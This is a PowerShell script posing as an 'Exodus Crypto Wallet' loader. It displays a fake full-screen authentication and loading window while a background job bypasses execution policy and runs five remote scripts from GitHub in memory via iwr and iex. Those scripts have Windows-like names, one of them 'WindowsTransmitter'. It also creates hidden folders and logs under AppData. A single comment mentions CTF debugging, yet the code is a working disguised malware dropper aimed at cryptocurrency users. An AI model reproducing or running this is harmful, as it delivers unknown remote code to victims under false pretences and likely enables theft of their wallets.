Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# ==================== DOWNLOAD UND AUSFÜHRUNG DER SCRIPTS (IN-MEMORY FIX) ====================
# Flexibler Pfad pro User
$baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
$operationDir = Join-Path $baseDir "operation"
$targetDir = Join-Path $operationDir "System"

# Scripts-Liste mit Raw-URLs
$scripts = @(
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; FileName = "MicrosoftViewS.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; FileName = "Sytem.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; FileName = "WindowsCeasar.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; FileName = "WindowsOperator.ps1" },
    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; FileName = "WindowsTransmitter.ps1" }
)

# Funktion zum Verstecken von Ordnern/Dateien
function Set-HiddenAttribute {
    param($path)
    if (Test-Path $path) {
        Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    }
}

# Verzeichnisse erstellen und verstecken (nur für Logs)
if (-not (Test-Path $operationDir)) { New-Item -ItemType Directory -Path $operationDir -Force | Out-Null }
Set-HiddenAttribute -path $operationDir
if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }
Set-HiddenAttribute -path $targetDir

# Log-Datei (hidden)
$logPath = Join-Path $targetDir "download_errors.log"
if (Test-Path $logPath) { Set-HiddenAttribute -path $logPath }

# Verbesserte Funktion: In-Memory Download & Exec (wie dein manueller Befehl)
function Invoke-ScriptInMemory {
    param($Url, $FileName, $LogPath)
    
    try {
        # Direkter In-Memory-Download & Exec (Bypass via -ep bypass -c)
        $execCmd = "powershell -ep bypass -c `"iwr '$Url' -UseBasicParsing | % { iex `$_.Content }`""
        Invoke-Expression $execCmd  # Führt es direkt aus (in-memory, kein File)
        
        # Erfolg loggen
        Add-Content -Path $LogPath -Value "$(Get-Date): Erfolgreich ausgeführt: $FileName"
        Write-Output "SUCCESS: $FileName geladen & exec'd"  # Für Receive-Job
    } catch {
        $errorMsg = "Fehler bei $FileName`: $($_.Exception.Message)"
        Add-Content -Path $LogPath -Value "$(Get-Date): $errorMsg"
        Write-Output $errorMsg  # Debug-Output
    }
}

# Background-Job: Jetzt asynchron, In-Memory & mit Debug
$downloadJob = Start-Job -ScriptBlock {
    param($targetDir, $scripts, $logPath)
    
    # Policy im Job bypassen
    Set-ExecutionPolicy Bypass -Scope Process -Force
    
    # Für jeden Script: In-Memory aufrufen
    foreach ($script in $scripts) {
        Invoke-ScriptInMemory -Url $script.Url -FileName $script.FileName -LogPath $logPath
        Start-Sleep -Milliseconds 500  # Kurze Pause, falls Scripts sequentiell laufen sollen
    }
    
    Write-Output "Alle Scripts verarbeitet. Job fertig."  # Signal für Receive-Job
} -ArgumentList $targetDir, $scripts, $logPath

# Optional: Nach 10 Sek. Job-Status checken (für CTF-Debug)
Start-Sleep -Seconds 10
$jobStatus = Receive-Job $downloadJob -Keep
if ($jobStatus) { Write-Host "Job-Output: $jobStatus" }  # Siehst du in der Konsole (für Testing)

# ==================== HAUPTFENSTER (unverändert, dein cooler GUI-Teil) ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true

# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)

# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
try {
    Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing
} catch {
    Write-Host "GIF-Download fehlgeschlagen: $_"
}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)

# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)

# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)

$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)

# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")

# Docking-Reihenfolge für unten
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)

# ===================== TIMER SETUP =====================
$marqueePos = 0
$percent = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000

# ===================== STATUS PHASEN =====================
$authPhaseDuration = 15000  # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date

# Anfangstexte
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text = "Performing background security checks..."
$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)
$statusIndex = 0
$dotCount = 0

# ===================== Fortschritt / Balken Animation =====================
$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text = $statuses[0]
        }
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos
        if ($inAuthPhase) { return }
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }
    } catch {}
})

# ===================== TEXT-ANIMATION =====================
$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }
        if ($inAuthPhase) { return }
        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]
    } catch {}
})

# ===================== CLEANUP (mit Job-Wait!) =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
    # WICHTIG: Warte auf Job (max 30 Sek., dann kill)
    $jobTimeout = 30
    $timeoutJob = Start-Job { Start-Sleep $using:jobTimeout }
    $done = $false
    while (-not $done -and (Get-Job $timeoutJob).State -eq 'Running') {
        if ($downloadJob.State -eq 'Completed') {
            Receive-Job $downloadJob | Out-Null
            $done = $true
        }
        Start-Sleep -Milliseconds 500
    }
    if (-not $done) {
        Stop-Job $downloadJob
        Receive-Job $downloadJob | Out-Null
    }
    Remove-Job $downloadJob, $timeoutJob -Force
    # Cleanup: Logs hidden, Temp löschen falls nötig
    if (Test-Path $gifPath) { Remove-Item $gifPath -Force }
})

$timer.Start()
$labelTimer.Start()
$form.Add_Shown({
    $form.Activate()
    $form.Cursor = [System.Windows.Forms.Cursors]::Default
})
$form.ShowDialog() | Out-Null
